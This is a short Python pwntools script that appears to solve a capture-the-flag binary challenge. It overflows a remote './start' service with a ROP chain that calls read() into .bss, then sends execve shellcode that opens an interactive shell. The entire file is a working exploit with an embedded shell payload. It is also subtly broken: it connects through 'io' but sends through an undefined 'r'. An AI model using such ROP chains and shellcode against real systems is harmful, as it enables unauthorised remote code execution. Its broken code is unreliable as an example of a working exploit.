from pwn import *

# io = process('./start')
io = remote('139.59.114.220', 10001)
elf = ELF('./start')
context.arch = 'amd64'

padding = "\x90"*24
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" #27
read = elf.symbols['read']
pop_rsi_r15 = 0x00000000004005c1
bss = elf.bss()+0x100

payload = flat([padding, pop_rsi_r15, bss, "aaaabbbb", read, bss])

r.sendline(payload)

r.sendline(shellcode)

r.interactive()
